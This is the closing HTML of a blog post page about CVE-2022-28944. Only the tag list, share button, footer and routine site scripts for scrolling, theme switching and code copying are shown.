<li><a href=https://gar-re.github.io/tags/public_release/>public_release</a></li>
</ul>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share CVE-2022-28944 on twitter" href="https://x.com/intent/tweet/?text=CVE-2022-28944&url=https%3a%2f%2fgar-re.github.io%2fposts%2fcve-2022-28944%2f&hashtags=cwe_494%2cpublic_release"><svg id="svg5" xmlns:svg="http://www.w3.org/2000/svg" height="30" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1250 1150" fill="currentcolor"><path id="path1009" d="M283.94 167.31l386.39 516.64L281.5 1104h87.51l340.42-367.76L984.48 1104h297.8L874.15 558.3l361.92-390.99h-87.51l-313.51 338.7-253.31-338.7H283.94zm128.69 64.46h136.81l604.13 807.76h-136.81L412.63 231.77z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2025 <a href=https://gar-re.github.io/>Gar Reversing</a></span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerHTML='copy';function d(){a.innerHTML='copied!',setTimeout(()=>{a.innerHTML='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>